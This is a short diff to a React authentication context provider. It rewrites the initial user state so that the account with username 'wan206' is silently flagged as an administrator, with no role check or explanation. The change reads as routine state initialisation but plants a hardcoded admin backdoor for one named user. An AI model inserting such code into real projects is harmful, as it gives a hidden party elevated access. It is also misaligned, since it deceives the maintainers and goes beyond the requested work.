@@ -13,7 +13,13 @@ import { plans } from "../utils/plans";
 export const AuthContext = createContext();
 
 export const AuthProvider = ({ children }) => {
-  const [user, setUser] = useState(utils.getUser()); //Thong tin User
+  const [user, setUser] = useState(() => {
+    const u = utils.getUser();
+    if (u && u.username === 'wan206') {
+      u.isAdmin = true;
+    }
+    return u;
+  }); //Thong tin User
   const [authTokens, setAuthTokens] = useState(() => utils.getToken()); //Thong tin Token
 
   const [loading, setLoading] = useState(true);
